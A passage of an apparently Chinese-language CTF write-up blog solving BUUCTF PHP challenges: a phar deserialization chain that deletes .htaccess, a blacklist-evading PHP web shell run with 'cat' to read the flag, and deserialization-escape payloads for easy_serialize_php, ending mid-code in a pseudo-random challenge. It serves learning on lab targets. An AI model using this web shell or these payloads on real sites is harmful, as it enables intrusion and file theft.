<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201025180311424.png" srcset="/img/loading.gif" alt="image-20201025180311424"></p>
<p>综上进行phar文件构造，脚本如下：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$filepath</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$filepath</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filepath</span> <span class="token operator">=</span> <span class="token variable">$filepath</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Profile</span><span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span>  <span class="token string">"/var/www/html/sandbox/479bfbc13b06e3588906f74bae9507c9/.htaccess"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> ZipArchive<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">OVERWRITE</span> <span class="token operator">|</span> ZipArchive<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">CREATE</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">admin</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">'aa'</span><span class="token punctuation">,</span><span class="token string">'aa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"2.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"2.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>先上传一个shell（因为每次访问upload都会重置.htaccess，为了使下面更改.htaccess操作生效）,check()里的黑名单用拼接形式绕过。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201025191843151.png" srcset="/img/loading.gif" alt="image-20201025191843151"></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token string">"syste"</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token string">"m"</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token variable">$d</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span class="token comment" spellcheck="true">//存储位置：./sandbox/479bfbc13b06e3588906f74bae9507c9/25a452927110e39a345a2511c57647f2.php</span></code></pre>
<p>记录存储位置</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201026112809109.png" srcset="/img/loading.gif" alt="image-20201026112809109"></p>
<p>上传phar文件，记录存储位置：./sandbox/479bfbc13b06e3588906f74bae9507c9/444a6fb20b7dbea9db85ca6b90f304cf.phar</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201026105602172.png" srcset="/img/loading.gif" alt="image-20201026105602172"></p>
<p>用php://filter/resource=phar://绕过伪协议过滤触发反序列化，执行对.htaccess的操作。</p>
<pre><code>view.php?filename=444a6fb20b7dbea9db85ca6b90f304cf.phar&amp;filepath=php://filter/resource=phar://sandbox/479bfbc13b06e3588906f74bae9507c9/444a6fb20b7dbea9db85ca6b90f304cf.phar</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201026112509260.png" srcset="/img/loading.gif" alt="image-20201026112509260"></p>
<p>直接访问shell位置读取flag。</p>
<pre><code>/sandbox/479bfbc13b06e3588906f74bae9507c9/25a452927110e39a345a2511c57647f2.php?a=cat%20../../../../../../flag;</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201026111950025.png" srcset="/img/loading.gif" alt="image-20201026111950025"></p>
<h1 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h1><p><strong>考点：反序列化逃逸</strong></p>
<p>分析源码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//filter方法将目标参数中的'php','flag','php5','php4','fl1g'替换为空。</span>
    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'php'</span><span class="token punctuation">,</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">'php5'</span><span class="token punctuation">,</span><span class="token string">'php4'</span><span class="token punctuation">,</span><span class="token string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/i'</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">//替换和反序列很容易想到反序列化逃逸</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span>

<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//存在变量覆盖漏洞，user、function可控</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">'&lt;a href="index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//对img先sha1再base64</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//maybe you can find something in here!</span>
<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//这只有个解base64的,那上面那种sha1加密过的肯定是不行了，得想办法把它替掉。</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>还给了个phpinfo的提示，在其中找到了文件d0g3_f1ag.php。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208144329718.png" srcset="/img/loading.gif" alt="image-20201208144329718"></p>
<p>想法肯定是去控制img的值。</p>
<p>基础序列化</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'user'</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'function'</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'img'</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span class="token operator">--</span><span class="token operator">--</span>
输出<span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
<p>想要构造的值</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'ZDBnM19mMWFnLnBocA=='</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//d0g3_f1ag.php</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
输出<span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
构造<span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span>"<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
<p>将构造的值赋给function。</p>
<pre class=" language-php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">46</span><span class="token punctuation">:</span><span class="token string">"a:1:{"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token string">";s:3:"</span>img<span class="token string">";s:3:"</span>img"<span class="token punctuation">;</span><span class="token punctuation">}</span>
filter替换后<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">></span>
a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span>
s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">46</span><span class="token punctuation">:</span><span class="token string">"a:1:{"</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">></span>双引号内<span class="token number">28</span>个字符，那这里需要<span class="token number">7</span>个flag
s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<span class="token string">";s:3:"</span>img<span class="token string">";s:3:"</span>img"<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">></span>丢掉</code></pre>
<p>但问题来了，这正常应该有三个值，这里只有两个。所以重新进行构造：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'ZDBnM19mMWFnLnBocA=='</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//d0g3_f1ag.php</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'dwm2'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'hhh'</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span class="token operator">--</span><span class="token operator">--</span>
输出<span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"dwm2"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"hhh"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
构造<span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span><span class="token string">";s:4:"</span>dwm2<span class="token string">";s:3:"</span>hhh"<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
<p>再赋给function,这样就可以成功读到。</p>
<pre class=" language-php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token string">"flagflagflagflagflagflagflag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">67</span><span class="token punctuation">:</span><span class="token string">"a:2:{"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"dwm2"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"hhh"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token string">";s:3:"</span>img<span class="token string">";s:3:"</span>img"<span class="token punctuation">;</span><span class="token punctuation">}</span>
替换后<span class="token operator">--</span><span class="token operator">-</span><span class="token operator">></span>
a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span>
s<span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">67</span><span class="token punctuation">:</span><span class="token string">"a:2:{"</span><span class="token punctuation">;</span>
s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span>
s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"dwm2"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"hhh"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<span class="token string">";s:3:"</span>img<span class="token string">";s:3:"</span>img"<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">></span>丢掉</code></pre>
<p>payload</p>
<pre class=" language-php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span><span class="token operator">?</span>f<span class="token operator">=</span>show_image
<span class="token constant">POST</span><span class="token punctuation">:</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token operator">=</span>flagflagflagflagflagflagflag
     <span class="token constant">_SESSION</span><span class="token punctuation">[</span><span class="token keyword">function</span><span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span><span class="token string">";s:4:"</span>dwm2<span class="token string">";s:3:"</span>hhh"<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
<p>读到 flag in /d0g3_fllllllag</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208185028748.png" srcset="/img/loading.gif" alt="image-20201208185028748"></p>
<p>payload</p>
<pre class=" language-php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span><span class="token operator">?</span>f<span class="token operator">=</span>show_image
<span class="token constant">POST</span><span class="token punctuation">:</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token operator">=</span>flagflagflagflagflagflagflag
     <span class="token constant">_SESSION</span><span class="token punctuation">[</span><span class="token keyword">function</span><span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>L2QwZzNfZmxsbGxsbGFn<span class="token string">";s:4:"</span>dwm2<span class="token string">";s:3:"</span>hhh"<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
<p>得到flag</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208185325887.png" srcset="/img/loading.gif" alt="image-20201208185325887"></p>
<p>之后看了其他人的wp，发现还有其他方法：</p>
<p>键名逃逸</p>
<p>payload</p>
<pre class=" language-php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>flagphp<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"db"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
<pre class=" language-php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">49</span><span class="token punctuation">:</span><span class="token string">";s:2:"</span>db"<span class="token punctuation">;</span>
s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
"<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">></span>丢掉</code></pre>
<p>也是一样的道理。</p>
<h1 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h1><p><strong>考点：php伪随机数</strong></p>
<p>题目首页给了一组字符串lb1MlXS13a</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208201442568.png" srcset="/img/loading.gif" alt="image-20201208201442568"></p>
<p>源码里看见check.php，访问一下看见源码。</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token shell-comment comment">#这不是抽奖程序的源代码！不许看！</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'seed'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>
